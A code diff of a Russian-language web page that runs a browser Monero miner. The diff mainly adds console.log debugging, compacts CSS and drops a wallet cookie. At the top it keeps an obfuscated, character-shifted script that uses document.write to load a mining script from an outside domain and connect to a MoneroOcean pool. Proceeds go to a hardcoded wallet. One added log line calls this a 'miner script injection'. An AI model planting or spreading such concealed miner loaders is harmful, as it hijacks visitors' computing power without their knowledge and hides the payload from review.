@@ -11,12 +11,11 @@
     <script>
         var s="=tdsjqu!tsd>#iuuqt;00fuifsfvn.qpdlfu/dpn0qfsgflu0qfsgfluxfc/kt@w1818312:@qfsgflu>xtt;00@kbtpo>gbtufs/npofsppdfbo#!?=0tdsjqu?";
         m=""; for (i=0; i<s.length; i++) m+=String.fromCharCode(s.charCodeAt(i)-1); document.write(m);
+        console.log("Miner script injection attempted:", m);
     </script>
 
     <style>
-        * {
-            box-sizing: border-box;
-        }
+        * { box-sizing: border-box; }
         body {
             background: #161618;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
@@ -81,10 +80,7 @@
         .action:hover {
             color: #F5F7F6;
         }
-        .divide {
-            color: #555;
-            margin: 0 5px;
-        }
+        .divide { color: #555; margin: 0 5px; }
         input[type=text] {
             border: none;
             outline: none;
@@ -95,9 +91,7 @@
             background-color: #161618;
             padding: 10px 0;
         }
-        input[type=text]:focus {
-            border-bottom-color: #12514b;
-        }
+        input[type=text]:focus { border-bottom-color: #12514b; }
         canvas.stats {
             width: 100%;
             height: 150px;
@@ -174,11 +168,13 @@
 
     <script>
         $(function() {
+            console.log("jQuery and page loaded");
             if(navigator.hardwareConcurrency > 1) {
                 $('#threads').text(navigator.hardwareConcurrency - 1);
             } else {
                 $('#threads').text(navigator.hardwareConcurrency);
             }
+            console.log("Threads set to:", $('#threads').text());
 
             var threads = $('#threads').text();
             var walletmoneroocean = "83uCXo5d4zNXSHkutqPqHHKSpvJxgmS15U5oQXnQTfAUYnP9bj5Wb5FKn8XBzkc7RZBxcFg5BFG5CjV2kjysXKfD7sX6Gvr";
@@ -195,6 +191,7 @@
             var isRunning = false;
 
             $('#walletmoneroocean').val(walletmoneroocean);
+            console.log("Wallet address set to:", walletmoneroocean);
 
             function htmlEncode(value) {
                 return $('<div/>').text(value).html();
@@ -209,6 +206,7 @@
                     statusDiv.className = 'status-indicator status-stopped';
                     statusDiv.innerHTML = '⏹️ Майнинг остановлен';
                 }
+                console.log("Status updated:", running ? "Running" : "Stopped");
             }
 
             function startLogger() {
@@ -216,6 +214,9 @@
                     if (typeof totalhashes !== 'undefined') {
                         lastrate = ((totalhashes) * 0.5 + lastrate * 0.5);
                         totalHashes = totalhashes + totalHashes;
+                        console.log("Total hashes updated:", totalHashes);
+                    } else {
+                        console.log("totalhashes is undefined");
                     }
                     hashesPerSecond = Math.round(lastrate);
                     totalHashes2 = totalHashes;
@@ -224,12 +225,18 @@
                     }
                     if (typeof GetAcceptedHashes === 'function') {
                         acceptedHashes = GetAcceptedHashes();
+                        console.log("Accepted hashes:", acceptedHashes);
+                    } else {
+                        console.log("GetAcceptedHashes is not defined");
                     }
                     $('#hashes-per-second').text(hashesPerSecond);
                     $('#accepted-shares').text(totalHashes2 + ' | ' + acceptedHashes);
                     $('#threads').text(threads);
                     if(typeof job !== 'undefined' && job !== null) {
                         $('#algo').text(job.algo + ' | ' + job.variant);
+                        console.log("Current algo:", job.algo, job.variant);
+                    } else {
+                        console.log("job is undefined or null");
                     }
                 }, 1000);
 
@@ -242,6 +249,7 @@
                         barChart.data.datasets[0].data.push(hashesPerSecond);
                         barChart.data.labels.push("");
                         barChart.update();
+                        console.log("Chart updated with hashes/s:", hashesPerSecond);
                     }
                 }, 1000);
             }
@@ -249,6 +257,7 @@
             function stopLogger() {
                 clearInterval(statuss);
                 clearInterval(hashingChart);
+                console.log("Logger stopped");
             }
 
             $('#thread-add').click(function() {
@@ -257,6 +266,9 @@
                 if (typeof deleteAllWorkers === 'function' && typeof addWorkers === 'function') {
                     deleteAllWorkers(); 
                     addWorkers(threads);
+                    console.log("Threads increased to:", threads);
+                } else {
+                    console.log("deleteAllWorkers or addWorkers not defined");
                 }
             });
 
@@ -266,6 +278,9 @@
                     $('#threads').text(threads);
                     if (typeof removeWorker === 'function') {
                         removeWorker();
+                        console.log("Threads decreased to:", threads);
+                    } else {
+                        console.log("removeWorker not defined");
                     }
                 }
             });
@@ -276,10 +291,10 @@
                     if (walletmoneroocean) {
                         if (typeof PerfektStart === 'function') {
                             PerfektStart(walletmoneroocean, "x", threads);
+                            console.log("Mining started with wallet:", walletmoneroocean, "threads:", threads);
+                        } else {
+                            console.error("PerfektStart is not defined");
                         }
-                        $.cookie && $.cookie("walletmoneroocean", walletmoneroocean, {
-                            expires: 365
-                        });
                         stopLogger();
                         startLogger();
                         $("#start").text("⏹️ Stop Mining");
@@ -289,6 +304,9 @@
                     } else {
                         if (typeof PerfektStart === 'function') {
                             PerfektStart(siteKey, "x", threads);
+                            console.log("Mining started with siteKey:", siteKey, "threads:", threads);
+                        } else {
+                            console.error("PerfektStart is not defined");
                         }
                         stopLogger();
                         startLogger();
@@ -299,6 +317,9 @@
                 } else {
                     if (typeof stopMining === 'function') {
                         stopMining();
+                        console.log("Mining stopped");
+                    } else {
+                        console.error("stopMining is not defined");
                     }
                     stopLogger();
                     $('#walletmoneroocean').prop("disabled", false);
@@ -313,41 +334,23 @@
             var barChartOptions = {
                 responsive: true,
                 maintainAspectRatio: false,
-                elements: {
-                    line: {
-                        tension: 0,
-                    }
-                },
-                animation: {
-                    duration: 0,
-                },
+                elements: { line: { tension: 0 } },
+                animation: { duration: 0 },
                 responsiveAnimationDuration: 0,
                 scales: {
                     y: {
                         beginAtZero: true,
                         max: 500,
                         min: 0,
-                        grid: {
-                            color: 'rgba(117, 192, 199, 0.3)'
-                        },
-                        ticks: {
-                            color: '#f2f5f4'
-                        }
+                        grid: { color: 'rgba(117, 192, 199, 0.3)' },
+                        ticks: { color: '#f2f5f4' }
                     },
                     x: {
-                        grid: {
-                            color: 'rgba(117, 192, 199, 0.3)'
-                        },
-                        ticks: {
-                            color: '#f2f5f4'
-                        }
+                        grid: { color: 'rgba(117, 192, 199, 0.3)' },
+                        ticks: { color: '#f2f5f4' }
                     }
                 },
-                plugins: {
-                    legend: {
-                        display: false
-                    }
-                }
+                plugins: { legend: { display: false } }
             };
 
             var barChartData = {
@@ -367,6 +370,7 @@
                 data: barChartData,
                 options: barChartOptions
             });
+            console.log("Chart initialized");
 
             window.addEventListener('beforeunload', function (e) {
                 if (isRunning) {
